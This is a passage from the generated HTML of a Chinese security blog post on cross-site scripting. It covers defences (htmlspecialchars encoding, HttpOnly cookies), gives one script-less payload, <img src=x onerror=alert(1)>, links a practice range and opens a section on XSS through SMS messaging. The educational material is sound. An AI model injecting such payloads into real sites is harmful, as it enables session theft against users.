+<h2 id="防御与修复"><a href="#防御与修复" class="headerlink" title="防御与修复"></a>防御与修复</h2><p>使用<code>htmlspecialchars()</code>将一些预定义字符转换成HTML实体<br>预定义的字符是：<br><code>&amp;</code> =&gt; <code>&amp;amp;</code><br><code>&quot;</code> =&gt; <code>&amp;quot;</code><br><code>&#39;</code> =&gt; <code>&amp;#39</code><br><code>&lt;</code> =&gt; <code>&amp;lt;</code><br><code>&gt;</code> =&gt; <code>&amp;gt;</code></p>
+<p>HTTP-only<br>当Cookie设置为HTTP-only之后，浏览器的Cookie无法通过客户端js脚本获取<br>eg<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Cookie: PHPSESSID=p31aa0tcd4h5qmgjsff87ie680; path=/; HttpOnly<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="XSS小结"><a href="#XSS小结" class="headerlink" title="XSS小结"></a>XSS小结</h3><p>JavaScript能做的，XSS都能做，并且还能做一些HTML和CSS的内容</p>
+<p>不使用script标签的XSS<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"x"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span><br></code></pre></td></tr></table></figure></p>
+<p><a href="http://test.xss.tv/" target="_blank" rel="noopener">XSS靶场</a></p>
+<hr>
+<h3 id="用短信完成XSS"><a href="#用短信完成XSS" class="headerlink" title="用短信完成XSS"></a>用短信完成XSS</h3><p>Verizon Messages(Message+)<br>是Verizon推出的一款开放跨平台信息交换应用程序，它允许用户在更多的无线设备中交换和共享信息。目前，该软件客户端支持跨平台使用，包括移动设备、桌面设备和Web段，并提升了VZW文字短信的用户体验度</p>
+
+    </main>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
+        
+        <a class="post-tag button" href="/tags/XSS/" rel="tag"><i class="fas fa-tags"></i>XSS</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  
+<div class="reward" id="reward">
+  <p>您的支持是我前进的动力！</p>
+  <button id="reward-button" class="button" disable="enable">打赏</button>
+  <div id="qr" class="qr" style="display: none;" aria-hidden="true">
+    
+    
+    
+  </div>
+</div>
+
+
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/2019/01/18/Deserialization-vulnerability/" rel="next" title="PHP反序列化漏洞"><i class="fas fa-angle-left"></i><span class="nav-title">PHP反序列化漏洞</span></a>
+      
+    </div>
+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/2019/01/22/CSRF/" rel="prev" title="CSRF跨站请求伪造"><span class="nav-title">CSRF跨站请求伪造</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
+</div>
+
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="搜索" class="form-control">
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <img class="author-avatar" src="/images/myavatar.jpg" alt="TuringGu">
+  
+  <h1 class="author-name">TuringGu</h1>
+  <h2 class="author-description"></h2>
+  <div class="site-count">
+    
+    <div class="archives-count">
+      <div class="site-count-title">归档</div>
+      <div><a href="/archives/">38</a></div>
+    </div>
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="categories-count">
+      <div class="site-count-title">分类</div>
+      <div><a href="/categories/">0</a></div>
+    </div>
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="tags-count">
+      <div class="site-count-title">标签</div>
+      <div><a href="/tags/">73</a></div>
+    </div>
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    <hr>
+    <div class="post-toc sidebar-item" id="toc-div">
+      <div><i class="fas fa-list-ol"></i>文章目录</div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#相关基础"><span class="toc-text">相关基础</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#浏览器工作机制"><span class="toc-text">浏览器工作机制</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#JavaScript"><span class="toc-text">JavaScript</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Cookie"><span class="toc-text">Cookie</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#基础知识"><span class="toc-text">基础知识</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#漏洞介绍"><span class="toc-text">漏洞介绍</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#产生条件"><span class="toc-text">产生条件</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#危害"><span class="toc-text">危害</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#XSS类别"><span class="toc-text">XSS类别</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#DOM型"><span class="toc-text">DOM型</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#存储型"><span class="toc-text">存储型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#常见用法"><span class="toc-text">常见用法</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Cookie获取"><span class="toc-text">Cookie获取</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#会话劫持"><span class="toc-text">会话劫持</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#钓鱼"><span class="toc-text">钓鱼</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#重定向钓鱼"><span class="toc-text">重定向钓鱼</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#HTML注入式钓鱼"><span class="toc-text">HTML注入式钓鱼</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#iframe钓鱼"><span class="toc-text">iframe钓鱼</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#XSS漏洞深入利用"><span class="toc-text">XSS漏洞深入利用</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#宕机攻击"><span class="toc-text">宕机攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#XSS平台搭建"><span class="toc-text">XSS平台搭建</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#XSS利用工具"><span class="toc-text">XSS利用工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#XSS变形与绕过"><span class="toc-text">XSS变形与绕过</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#大小写混合字符"><span class="toc-text">大小写混合字符</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#过滤尝试"><span class="toc-text">过滤尝试</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#使用其它标签"><span class="toc-text">使用其它标签</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#利用属性绕过"><span class="toc-text">利用属性绕过</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#利用事件绕过"><span class="toc-text">利用事件绕过</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#圆括号被过滤"><span class="toc-text">圆括号被过滤</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#利用编码绕过"><span class="toc-text">利用编码绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#防御与修复"><span class="toc-text">防御与修复</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#补充"><span class="toc-text">补充</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#XSS小结"><span class="toc-text">XSS小结</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#用短信完成XSS"><span class="toc-text">用短信完成XSS</span></a></li></ol></li></ol></div>
+    </div>
+    
+    
+    
+    
+    <hr>
+    <div class="blogroll sidebar-item">
+      <div><i class="fas fa-link"></i>友情链接</div>
+      <ul>
+        
+        <li><i class="fas fa-link"></i><a href="https://github.com/TuringGu" target="_blank">GitHub</a></li>
+        
+      </ul>
+    </div>
+    
+  </div>
+</aside>
+
+
+          
+        </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer" style="background: #33363b;">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="回到顶部"></i></button>
+    </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">TuringGu</span><span class="year"><i class="far fa-copyright"></i>2018 - 2019</span><span class="creative-commons"><i class="fab fa-creative-commons"></i><a href="http://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">BY-NC-ND 4.0</a></span>
+        </div>
+        
+        <div class="busuanzi">
+          <span id="busuanzi_container_site_pv"><i class="fas fa-eye" aria-label="站点点击量" aria-hidden="false"></i><span id="busuanzi_value_site_pv"></span></span><span id="busuanzi_container_site_uv"><i class="fas fa-user" aria-label="站点用户数" aria-hidden="false"></i><span id="busuanzi_value_site_uv"></span></span><span id="busuanzi_container_page_pv"><i class="far fa-file-alt"></i><span id="busuanzi_value_page_pv" aria-label="页面点击量" aria-hidden="false"></span></span>
+        </div>
+        
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
+          托管于<i class="fab fa-github-alt"></i><a href="https://pages.github.com/" target="_blank">GitHub Pages</a>
+          
+        </div>
+        <div class="powered-by">
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  </body>
+</html>
